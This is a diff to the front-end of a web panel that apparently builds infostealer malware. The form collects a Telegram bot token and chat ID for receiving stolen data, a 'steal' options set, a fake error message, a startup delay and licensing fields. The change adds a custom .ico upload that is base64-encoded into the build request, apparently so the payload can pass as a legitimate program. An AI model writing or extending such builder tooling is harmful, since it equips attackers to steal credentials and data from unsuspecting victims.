@@ -99,6 +99,13 @@
         <div style="height:12px"></div>
         <label class="fld">Startup delay (sec)</label>
         <div class="stepper"><button onclick="stepDelay(-1)">-</button><input id="startup_delay" type="number" value="0" min="0" style="max-width:120px"><button onclick="stepDelay(1)">+</button></div>
+        <div style="height:12px"></div>
+        <label class="fld">Custom icon (.ico)</label>
+        <div class="row">
+          <div class="grow"><input id="icon_name" type="text" placeholder="No icon selected" readonly></div>
+          <button type="button" class="sec" onclick="document.getElementById('icon_file').click()">Browse</button>
+          <input id="icon_file" type="file" accept=".ico,image/x-icon" style="display:none" onchange="pickIcon(this)">
+        </div>
       </div>
 
       <button class="btnbig" onclick="submitBuild()">BUILD</button>
@@ -182,6 +189,16 @@ function enterApp(){
   renderToggles(); loadBuilds();
 }
 
+let ICON_B64 = "";
+function pickIcon(inp){
+  const f=inp.files[0]; if(!f) return;
+  document.getElementById("icon_name").value=f.name;
+  if(f.size>2*1024*1024){ alert("icon over 2MB"); inp.value=""; ICON_B64=""; return; }
+  const rd=new FileReader();
+  rd.onload=e=>{ ICON_B64=String(e.target.result).split(",")[1]||""; };
+  rd.readAsDataURL(f);
+}
+
 async function submitBuild(){
   msg("buildMsg","");
   const steal={}, opts={};
@@ -191,6 +208,7 @@ async function submitBuild(){
   opts.error_text=document.getElementById("error_text").value;
   const body={ bot_token:val("bot_token"), chat_id:val("chat_id"), name:val("name"),
     licence_key:val("licence_key"), licence_url:val("licence_url"), steal, opts };
+  if(ICON_B64) body.icon_b64=ICON_B64;
   try{
     const d=await api("/api/build",{method:"POST",body:JSON.stringify(body)});
     if(!d.ok) throw new Error(d.error||"failed");
